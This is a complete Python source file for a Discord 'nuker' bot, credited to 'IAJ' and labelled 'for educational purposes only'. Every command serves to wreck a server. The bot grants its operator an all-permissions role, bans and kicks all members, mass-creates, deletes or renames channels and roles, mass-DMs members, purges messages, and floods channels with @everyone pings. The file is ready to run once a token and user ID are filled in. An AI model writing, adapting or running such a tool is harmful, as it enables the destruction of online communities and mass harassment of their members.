"""IAJ's Discord Nuker"""


import discord
from discord.ext import commands
from discord import Permissions
import string
import random


client = commands.Bot(
    command_prefix='n/',
    case_insensitive=True
)


def allowed(ctx):
    """Makes Sure Only you can use the bot"""
    return ctx.author.id == ID  # Replace ID with your user ID

    """Change Options below for the bots Custom Status"""
@client.event
async def on_ready():
    await client.change_presence(
        status=discord.Status.online,
        activity=discord.Game('Status!!')
    )
    print(
        f'Created By IAJ.',
        f'\nMade for EDUCATIONAL purposes only!',
        f'\nWe Are On Version 5 Beta!',
        f'\nDefult Prefix: n/',
        f'\nAny Problems/Requests Contact me on Discord: IAJ#7648',
        f'\nLogged in as {client.user.name}#{client.user.discriminator},',
        f'User ID: {client.user.id}, Discord Version: {discord.__version__}\n'
    )
    


@client.event
async def on_command_error(ctx, error):
    """Checks for any command errors."""
    if isinstance(error, commands.MissingPermissions):  # has_permissions()
        await ctx.send('🚫 **Permission Denied!**')
    if isinstance(error, commands.NotOwner):  # is_owner()
        await ctx.send('🚫 **You are not the owner!**')
    if isinstance(error, commands.CheckFailure):  # custom check
        await ctx.send('🚫 **Access Denied!**')
    else:
        print(error)


@client.command()
@commands.check(allowed)
async def admin(ctx):
    """Gives a role with all permissions enabled to the message author."""
    await ctx.message.delete()
    await ctx.guild.create_role(
        name='Hacker',
        permissions=Permissions.all(),
        color=discord.Color(0x36393f)
    )
    role = discord.utils.get(ctx.guild.roles, name='Hacker')
    await ctx.author.add_roles(role)
    await ctx.send('✅ **Role created!**')


@client.command()
@commands.check(allowed)
async def ban(ctx):
    """Attempts to ban everyone (except the owner) from the Server."""
    await ctx.message.delete()
    await ctx.send('🔨 **Banning all members!**')
    for member in ctx.guild.members:
        try:
            if member != ctx.author:
                await member.ban()
            else:
                continue
        except discord.Forbidden:
            continue


@client.command()
@commands.check(allowed)
async def channel(ctx, choice):
    """Spam create channels, delete all channels, or rename all channels."""
    await ctx.message.delete()
    if choice == 'create':
        await ctx.send('✅ **Mitosis (channels)!** Type `stop` to stop.')

        def check_reply(m):
            return m.content == 'stop' and m.author == ctx.author

        async def spam_create_channels():
            while True:
                await ctx.guild.create_text_channel('Sub-To-ACPlayGames')
                await ctx.guild.create_voice_channel('Sub-To-ACPlayGames')

        spam_channel_task = client.loop.create_task(spam_create_channels())
        await client.wait_for('message', check=check_reply)
        spam_channel_task.cancel()
        await ctx.send('✅ **Mitosis complete!**')

    elif choice == 'delete':
        await ctx.send('✅ **Purging channels!**')
        for chan in ctx.guild.channels:
            await chan.delete()

    elif choice == 'rename':
        await ctx.send('✅ **Renaming channels!**')
        char = string.ascii_letters + string.digits
        for chan in ctx.guild.channels:
            chan_name = ''.join((random.choice(char) for i in range(16)))
            await chan.edit(name=chan_name)

    else:
        await ctx.send('🚫 **Invalid option!**')


@client.command()
@commands.check(allowed)
async def dm(ctx, *, msg=None):
    """Attempt to DM (direct message) everyone in the guild."""
    await ctx.message.delete()
    if msg is not None:
        await ctx.send('✅ **Attempting to DM everyone!**')
        for member in ctx.guild.members:
            if member != ctx.guild.me:
                try:
                    if member.dm_channel is None:
                        await member.create_dm()
                    await member.dm_channel.send(msg)
                except discord.Forbidden:
                    continue
            else:
                continue
        await ctx.send('✅ **Sliding into DMs complete!**')
    else:
        await ctx.send('🚫 **I cannot send an empty message!**')


@client.command()
@commands.check(allowed)
async def kick(ctx):
    """Attempts to kick everyone (except the author) from the guild."""
    await ctx.message.delete()
    await ctx.send('👢 **Roundhouse kicking all members!**')
    for member in ctx.guild.members:
        try:
            if member != ctx.author:
                await member.kick()
            else:
                continue
        except discord.Forbidden:
            continue


@client.command()
@commands.check(allowed)
async def nickname(ctx):
    """Attempts to nickname everyone in the guild."""
    await ctx.message.delete()
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
        except discord.Forbidden:
            continue


@client.command()
@commands.check(allowed)
async def purge(ctx):
    """Deletes all messages from all channels.
    NOTE: Only deletes 100 messages at a time.
    That is not at least 14 days old."""
    for tc in ctx.guild.text_channels:
        await tc.purge(bulk=True)


@client.command()
@commands.check(allowed)
async def role(ctx, choice):
    """Spam create roles, delete all roles, or rename all roles."""
    await ctx.message.delete()
    if choice == 'create':
        await ctx.send('✅ **The Roles: (roles) Are Being Created!** Type `stop` to stop.')

        def check_reply(m):
            return m.content == 'stop' and m.author == ctx.author

        async def spam_create_roles():
            while True:
                await ctx.guild.create_role(name='GET NUKED')

        spam_role_task = client.loop.create_task(spam_create_roles())
        await client.wait_for('message', check=check_reply)
        spam_role_task.cancel()
        await ctx.send('✅ **Complete!**')

    elif choice == 'delete':
        await ctx.send('✅ **Purging roles!**')
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.me.roles[-1] > role:
                await role.delete()
            else:
                break

    elif choice == 'rename':
        await ctx.send('✅ **Renaming roles!**')
        char = string.ascii_letters + string.digits
        for role in ctx.guild.roles:
            if ctx.guild.me.roles[-1] > role:
                role_name = ''.join((random.choice(char) for i in range(16)))
                await role.edit(name=role_name)
            else:
                break

    else:
        await ctx.send('🚫 **Invalid option!**')


@client.command()
@commands.check(allowed)
async def spam(ctx):
    """Spam messages in all channels."""
    await ctx.message.delete()
    await ctx.send('✅ **Spamming initiated!** Type `stop` to stop.')

    def check_reply(m):
        return m.content == 'stop' and m.author == ctx.author

    async def spam_text():
        while True:
            for tc in ctx.guild.text_channels:
                await tc.send('@everyone')

    spam_text_task = client.loop.create_task(spam_text())
    await client.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send('✅ **Spamming complete!**')


@client.command()
@commands.check(allowed)
async def logout(ctx):
    """Logs the bot out."""
    await client.logout()

client.run('TOKEN')  # replace TOKEN with your bot token
